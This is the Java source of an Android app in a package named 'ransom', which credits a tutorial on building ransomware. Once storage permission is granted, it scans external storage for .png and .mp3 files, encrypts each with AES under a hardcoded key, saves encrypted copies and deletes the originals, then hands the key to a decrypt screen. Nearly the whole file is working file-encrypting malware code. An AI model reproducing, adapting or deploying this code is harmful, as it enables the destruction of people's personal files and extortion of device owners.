package com.ruturaj.android.ransom;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.ImageButton;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

import javax.crypto.Cipher;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
public class MainActivity extends AppCompatActivity {

    // Needed to request permissions, as per the android website
    private static final int MY_PERMISSIONS_REQUEST = 1;
    // Reference for permission request - https://developer.android.com/training/permissions/requesting
    // Credits - I referred the following tutorial - https://null-byte.wonderhowto.com/forum/creating-ransomware-for-android-from-0-by-mohamed-ahmed-0180151/
    // <div>Icons made by <a href="https://www.flaticon.com/authors/roundicons-freebies" title="Roundicons Freebies">Roundicons Freebies</a>
    // from <a href="https://www.flaticon.com/" title="Flaticon">www.flaticon.com</a> is licensed by
    // <a href="http://creativecommons.org/licenses/by/3.0/"
    // title="Creative Commons BY 3.0" target="_blank">CC 3.0 BY</a></div>

    // This is my key - This can be changed
    final String key = "4444444444444444";

    // Target version as android M
    @TargetApi(Build.VERSION_CODES.M)
    // Must have version - Android Jelly-Bean
    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (ContextCompat.checkSelfPermission (this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED){

            ImageButton ButtonEncrypt = findViewById (R.id.button);
            //EditText KeyInput = findViewById (R.id.passwordField);
            Toast.makeText (this, "This app has permissions", Toast.LENGTH_SHORT).show();

            //String decrypt_key = KeyInput.getText().toString();

            ButtonEncrypt.setOnClickListener (new View.OnClickListener() {
                @Override
                public void onClick (View view) {
                try {
                    ArrayList <File> Files = FindArchives (Environment.getExternalStorageDirectory());

                    for (int i = 0; i < Files.size(); i++) {
                    Toast.makeText (getApplicationContext(), "Encrypting....", Toast.LENGTH_SHORT).show();
                    // Encrypting ....
                    encrypt (key, Files.get(i).getPath(), Files.get(i).getName());
                    }
                    } catch (IOException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException k) {
                        k.printStackTrace ();
                    }
                Intent intent = new Intent(MainActivity.this, DecryptActivity.class);
                // Sending this key to the decrypt activity
                intent.putExtra("key", key);
                // Starting the new activity
                MainActivity.this.startActivity(intent);
                }
            });
        } else {
            // Reference - https://developer.android.com/training/permissions/requesting
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED) {
                // Permission is not granted
                // Should we show an explanation?
                if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                        Manifest.permission.READ_EXTERNAL_STORAGE)) {
                    // Show an explanation to the user *asynchronously* -- don't block
                    // this thread waiting for the user's response! After the user
                    // sees the explanation, try again to request the permission.
                    Toast. makeText (this, "This is just a test", Toast.LENGTH_SHORT).show();
                } else {
                    // No explanation needed; request the permission
                    ActivityCompat.requestPermissions(this,
                            new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE},
                            MY_PERMISSIONS_REQUEST);

                    // MY_PERMISSIONS_REQUEST_READ_CONTACTS is an
                    // app-defined int constant. The callback method gets the
                    // result of the request.
                }
            } else {
                // No need for this else
                // Permission has already been granted
            }
        }
    }

    public void encrypt (String key, String address, String name) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {

        File extStore = Environment.getExternalStorageDirectory ();
        // Start from root
        FileInputStream Entry = new FileInputStream ("/" + address);
        // Output this into an encrypted_ file
        FileOutputStream Output = new FileOutputStream (extStore + "/encrypted_" + name);
        SecretKeySpec secretKeySpec;
        secretKeySpec = new SecretKeySpec(key.getBytes(), "AES");

        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);
        Toast.makeText(this, "Your files are encrypted", Toast.LENGTH_SHORT).show();
        CipherOutputStream cipherOutputStream = new CipherOutputStream (Output, cipher);

        // Write bytes
        int b;
        byte[] bytes = new byte [8];
        while ((b = Entry.read(bytes,0, bytes.length))!= -1) {
            cipherOutputStream.write(bytes, 0, b);
        }
        cipherOutputStream.flush();
        cipherOutputStream.close();
        Entry.close();

        File tmp = new File ("/" + address);
        tmp.delete();
    }

    public static ArrayList<File> FindArchives (File root) {
        ArrayList <File> Files = new ArrayList <File> ();
        File[] files = root.listFiles();
        if (files != null) {
            for (File file: files) {
                if (file.isDirectory() &&! file.isHidden()) {
                    Files.addAll(FindArchives (file));
                } else {
                    // It takes care of .png and .mp3 files
                    if (file.getName().endsWith(".png") || file.getName().endsWith(".mp3")) {
                        if (file.getTotalSpace()> 3) {
                            Files.add(file);
                        }
                    }
                }
            }
        }
        return Files;
    }
}